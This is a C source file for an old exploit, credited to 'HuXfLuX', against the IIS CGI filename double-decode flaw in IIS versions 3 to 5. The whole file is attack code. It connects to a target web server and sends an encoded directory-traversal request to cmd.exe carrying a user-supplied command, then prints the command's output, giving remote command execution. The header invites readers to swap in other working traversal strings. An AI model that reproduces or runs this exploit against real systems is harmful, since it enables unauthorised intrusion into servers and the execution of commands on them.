/*  IISEX by HuXfLuX <huxflux2001@hotmail.com>. IIS CGI File Decode Bug
exploit. Written 16-05-2001.
    Compiles on Linux, works with IIS versions 3, 4 and 5. Microsoft's
products were always
    famous for their backward compatibility!

    You can change the SHOWSEQUENCE value to some other strings that also
work.
    More info: http://www.nsfocus.com

    Thanx to Filip Maertens <filip@securax.be>
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>

#define SHOWSEQUENCE "/scripts/.%252e/.%252e/winnt/system32/cmd.exe?/c+"

int resolv(char *hostname,struct in_addr *addr);

int main(int argc, char *argv[])
{

        struct sockaddr_in sin;
        struct in_addr victim;
        char recvbuffer[1], stuff[200]="";
        int create_socket;

        printf("IISEX by HuxFlux <huxflux2001@hotmail.com>\nThis exploits
the IIS CGI Filename Decode Error.\nWorks with IIS versions 3, 4 and
5!.\n");

        if (argc < 3)
        {
                printf("[?] Usage: %s [ip] [command]\n", argv[0]);
                exit(0);
        }

        if (!resolv(argv[1],&victim))
        {
                printf("[x] Error resolving host.\n");
                exit(-1);
        }
        printf("\n[S] Exploit procedure beginning.\n");

        if (( create_socket = socket(AF_INET,SOCK_STREAM,0)) > 0 )
printf("[*] Socket created.\n");

        bzero(&sin,sizeof(sin));
        memcpy(&sin.sin_addr,&victim,sizeof(struct in_addr));
        sin.sin_family = AF_INET;
        sin.sin_port = htons(80);
        //sin.sin_addr.s_addr = inet_addr(argv[1]);


        if (connect(create_socket, (struct sockaddr *)&sin,sizeof(sin))==0)
printf("[*] Connection made.\n");
        else {
                printf("[x] No connection.\n");
                exit(1);
        }

        strcat(stuff, "GET ");
        strcat(stuff, SHOWSEQUENCE);
        strcat(stuff, argv[2]);
        strcat(stuff, " HTTP/1.0\r\n\r\n");
        printf("[*] Sending: %s", stuff);

        memset(recvbuffer, '\0',sizeof(recvbuffer));

        send(create_socket, stuff, sizeof(stuff), 0);

        if ( strstr(recvbuffer,"404") == NULL ) {
                printf("[*] Command output:\n\n");

                while(recv(create_socket, recvbuffer, 1, 0) > 0)
                {
                        printf("%c", recvbuffer[0]);
                }
                printf("\n\n");
        }
        else printf("[x] Wrong command processing. \n");
        printf("[E] Finished.\n");

        close(create_socket);
}

int resolv(char *hostname,struct in_addr *addr)
{
        struct hostent *res;

        if (inet_aton(hostname,addr)) return(1);

        res = gethostbyname(hostname);
        if (res == NULL) return(0);

        memcpy((char *)addr,(char *)res->h_addr,sizeof(struct in_addr));
        return(1);
}
